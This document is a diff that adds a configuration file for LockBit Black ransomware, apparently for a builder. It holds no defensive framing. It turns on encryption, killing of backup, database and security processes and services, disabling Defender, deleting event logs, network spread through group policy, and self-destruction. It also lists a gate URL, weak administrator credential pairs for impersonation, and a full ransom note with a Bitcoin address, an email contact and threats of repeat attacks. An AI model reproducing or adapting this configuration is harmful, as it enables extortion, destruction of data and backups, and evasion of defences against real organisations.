@@ -1,0 +1,67 @@
+{
+  "bot": {
+    "uid": "31300000000000000000000000000000",
+    "key": "31300000000000000000000000000000"
+  },
+"config": {
+    "settings": {
+      "encrypt_mode": "auto",
+      "encrypt_filename": false,
+      "impersonation": false,
+      "skip_hidden_folders": false,
+      "language_check": false,
+      "local_disks": true,
+      "network_shares": false,
+      "kill_processes": true,
+      "kill_services": true,
+      "running_one": true,
+      "print_note": true,
+      "set_wallpaper": true,
+      "set_icons": true,
+      "send_report": false,
+      "self_destruct": true,
+      "kill_defender": true,
+      "wipe_freespace": false,
+      "psexec_netspread": false,
+      "gpo_netspread": true,
+      "gpo_ps_update": true,
+      "shutdown_system": false,
+      "delete_eventlogs": true,
+      "delete_gpo_delay": 1
+    },
+    "white_folders": "$recycle.bin;config.msi;$windows.~bt;$windows.~ws;windows;boot;system volume information;tor browser;windows.old;intel;msocache;perflogs;x64dbg;public;all users;default;microsoft",
+    "white_files": "autorun.inf;boot.ini;bootfont.bin;bootsect.bak;desktop.ini;iconcache.db;ntldr;ntuser.dat;ntuser.dat.log;ntuser.ini;thumbs.db;GDIPFONTCACHEV1.DAT;d3d9caps.dat",
+    "white_extens": "386;adv;cab;cmd;com;cpl;cur;deskthemepack;diagcab;diagcfg;diagpkg;drv;exe;hlp;icl;icns;ico;ics;idx;ldf;lnk;mod;mpa;msc;msp;msstyles;msu;nls;nomedia;ocx;prf;rom;scr;shs;spl;sys;theme;themepack;wpx;lock;key;hta;pdb;search-ms",
+    "white_hosts": "WS2024",
+    "kill_processes": "sql;oracle;ocssd;dbsnmp;synctime;agntsvc;isqlplussvc;xfssvccon;mydesktopservice;ocautoupds;encsvc;firefox;tbirdconfig;mydesktopqos;ocomm;dbeng50;sqbcoreservice;excel;infopath;msaccess;mspub;onenote;outlook;powerpnt;steam;thebat;thunderbird;visio;winword;wordpad;notepad;calc;wuauclt;onedrive",
+    "kill_services": "vss;sql;svc$;memtas;mepocs;msexchange;sophos;veeam;backup;GxVss;GxBlr;GxFWD;GxCVD;GxCIMgr",
+    "gate_urls": "https://test.white-datasheet.com/;http://test.white-datasheet.com/",
+    "impers_accounts": "ad.lab:Qwerty!;Administrator:123QWEqwe!@#;Admin2:P@ssw0rd;Administrator:P@ssw0rd;Administrator:Qwerty!;Administrator:123QWEqwe;Administrator:123QWEqweqwe",
+    "note": "
+            ~~~ LockBit Black Ransomware Since 2024~~~
+
+>>>> Your data are stolen and encrypted
+
+	Price = 2000 $ 
+        Bitcoin = 328N9mKT6xFe6uTvtpxeKSymgWCbbTGbK2
+        Email = jimyjoy139@proton.me
+
+>>>> What guarantees that we will not deceive you? 
+
+	We are not a politically motivated group and we do not need anything other than your money. 
+    
+	If you pay, we will provide you the programs for decryption and we will delete your data. 
+	Life is too short to be sad. Be not sad, money, it is only paper.
+    
+	If we do not give you decrypters, or we do not delete your data after payment, then nobody will pay us in the future. 
+	Therefore to us our reputation is very important. We attack the companies worldwide and there is no dissatisfied victim after payment.
+    
+	
+>>>> Your personal DECRYPTION ID: WERTYFG34A48MK4D6D525F3F372263313 + ID Number.README.txt
+
+>>>> Warning! Do not DELETE or MODIFY any files, it can lead to recovery problems!
+
+>>>> Warning! If you do not pay the ransom we will attack your company repeatedly again!
+"
+  }
+}
